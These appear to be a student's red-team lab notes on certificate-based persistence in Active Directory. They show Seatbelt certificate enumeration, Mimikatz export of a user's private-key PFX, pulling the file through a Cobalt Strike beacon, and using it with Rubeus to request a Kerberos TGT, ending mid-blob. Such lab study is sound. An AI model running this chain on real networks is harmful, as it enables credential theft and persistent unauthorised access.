Certificates can also be useful for maintaining persistent access to both users and computers, because they tend to have a longer shelf-life compared to passwords.  For example, User certificates are valid for an entire year by default, regardless of password changes.
```POWERSHELL
CA Name             : dc-2.dev.cyberbotic.io\sub-ca
Template Name       : User
Schema Version      : 1
Validity Period     : 1 year
```
Certificates only become invalid if they're revoked by the CA (or expire).  This also does not rely on any vulnerable templates.  We can extract certificates that have already been issued, or just request new ones.


# User persistence

on `WKSTN-1` as `DEV\nlamb`

```powershell
[12/12 16:54:05] beacon> getuid
[12/12 16:54:05] [*] Tasked beacon to get userid
[12/12 16:54:08] [+] host called home, sent: 24 bytes
[12/12 16:54:08] [*] You are DEV\nlamb
[12/12 16:54:11] beacon> run hostname
[12/12 16:54:11] [*] Tasked beacon to run: hostname
[12/12 16:54:11] [+] host called home, sent: 26 bytes
[12/12 16:54:12] [+] received output:
wkstn-1
```
*Always ensure the certificate is used for client authentication*
```powershell
[12/12 16:55:58] beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
[12/12 16:56:05] [*] Tasked beacon to run .NET program: Seatbelt.exe Certificates
[12/12 16:56:05] [+] host called home, sent: 711956 bytes
[12/12 16:56:07] [+] received output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== Certificates ======

  StoreLocation      : LocalMachine
  Issuer             : CN=sub-ca, DC=dev, DC=cyberbotic, DC=io
  Subject            : CN=wkstn-1.dev.cyberbotic.io
  ValidDate          : 9/25/2023 8:45:53 PM
  ExpiryDate         : 8/15/2024 5:16:13 PM
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 024FBA0069B03CF85E828DA1D04F1B7C627D1E0A
  Template           : Template=Auto Computer(1.3.6.1.4.1.311.21.8.15282360.375742.5457048.13770747.14451586.76.15465664.6854908), Major Version Number=100, Minor Version Number=5
  EnhancedKeyUsages  :
       Server Authentication
       Client Authentication     [!] Certificate is used for client authentication!



[*] Completed collection in 0.109 seconds
```
Certificates can be exported with Mimikatz using `crypto::certificates` (although it drops them to disk).
```powershell
beacon> mimikatz crypto::certificates /export

    Public export  : OK - 'CURRENT_USER_My_0_Nina Lamb.der'
    Private export : OK - 'CURRENT_USER_My_0_Nina Lamb.pfx'
```
`download` the file
```powershell
beacon> download CURRENT_USER_My_0_Nina Lamb.pfx
[*] started download of C:\Users\nlamb\CURRENT_USER_My_0_Nina Lamb.pfx (3454 bytes)
[*] download of CURRENT_USER_My_0_Nina Lamb.pfx is complete
```
navigate to `View -> Downloads` to sync files from `Cobalt Strike`
Base64 encode the pfx file in `wsl`
```powershell

ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

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
```
Then use it with Rubeus to obtain a TGT.  The export password will be `mimikatz`.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate: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 /password:mimikatz /nowrap
```
kept getting `KRB-ERROR (62)` this is a common issue in the discord and `rastamouse` hasnt responded to help
```powershell
[12/12 17:51:35] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate: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